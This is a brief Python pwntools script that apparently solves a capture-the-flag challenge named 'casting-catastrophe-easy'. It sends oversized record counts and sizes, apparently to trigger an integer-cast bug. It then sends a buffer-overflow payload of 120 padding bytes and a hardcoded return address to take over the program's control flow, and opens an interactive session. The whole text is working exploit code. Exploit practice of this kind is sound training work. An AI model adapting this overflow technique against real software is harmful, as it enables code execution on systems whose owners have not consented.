from pwn import *

p = process('/challenge/casting-catastrophe-easy')

p.recvuntil('Number of payload records to send:')
p.sendline(b'65536')

p.recvuntil('Size of each payload record:')
p.sendline(b'65536')

payload = b'a' * 120 + p64(0x4016b9) 

#p.recvline('Send your payload')
p.sendline(payload)

p.interactive()

